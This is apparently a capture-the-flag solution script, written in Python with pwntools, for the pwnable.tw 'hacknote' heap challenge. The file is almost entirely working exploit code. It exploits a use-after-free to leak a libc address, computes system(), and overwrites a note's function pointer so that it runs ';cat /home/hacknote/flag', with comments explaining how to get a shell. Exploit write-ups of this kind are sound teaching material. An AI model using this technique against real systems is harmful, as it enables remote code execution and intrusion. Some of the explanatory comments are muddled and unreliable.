from pwn import *

s = remote("chall.pwnable.tw", 10102)
libc = ELF("libc_32.so.6")

def add(size, content):
	s.sendlineafter("Your choice :", str(1))
	s.sendlineafter("Note size :", str(size))
	s.sendlineafter("Content :", content)

def delete(index):
	s.sendlineafter("Your choice :", str(2))
	s.sendlineafter("Index :", str(index))

def printnote(index):
	s.sendlineafter("Your choice :", str(3))
	s.sendlineafter("Index :", str(index))
	return s.recv()

def main():
	# find the offset of system() function in libc file
	system_off = libc.symbols['system']
	# find the offset of .got.plt section in libc file
	gotplt_off = libc.get_section_by_name(".got.plt").header.sh_addr
	
	add(90, "aaaa")
	add(90, "bbbb")
	# after free(ing) a chunk with it's size > 0x60, there are 2 weird value 
	# stored in bk and fd. The point is those values is the same and involve 
	# gotplt_addr somehow
	delete(0)

	# we can leak these values by adding note with empty string and then printing that note 
	add(90, "")
	
	# we can print note 0 instead and that it's Use After Free vulnerability #1
	# to get in important value
	retstr = printnote(2)

	# we can find gotplt_addr with one of these values
	gotplt_addr = u32(retstr[0:4]) & 0xfffff000
	# then so easy to get libc_base and system_addr 
	libc_base = gotplt_addr - gotplt_off
	# system() is a special function we do need in libc file
	system_addr = libc_base + system_off
	
	# in this part I recommend you to check with gdb or something else for better understanding
	delete(0)
	delete(1)
	payload = p32(system_addr) + ";cat /home/hacknote/flag\x00"   # system() and ";" friend ^.^ 
	# here: because the system is already vulnerability so we can use size < 0x70 (like 90)
	# but now with most modern system we should use size = 8, hence 
	# payload = p32(system_addr) + ";sh\x00" , add(8, payload) => get shell and find flag
	add(90, payload)
	
	# here Use After Free vulnerability again xD #2
	# to execute system() function and get a shell (if you want ^^) 
	s.sendlineafter("Your choice :", str(3))
	s.sendlineafter("Index :", str(0))
	print s.recv()
	
	#s.interactive()
	
	s.close()

if __name__ == "__main__":
	main()	

'''
This is the first solution but I like the second one more because it mentions 
double free vulnerability and other useful knowledge 
'''	
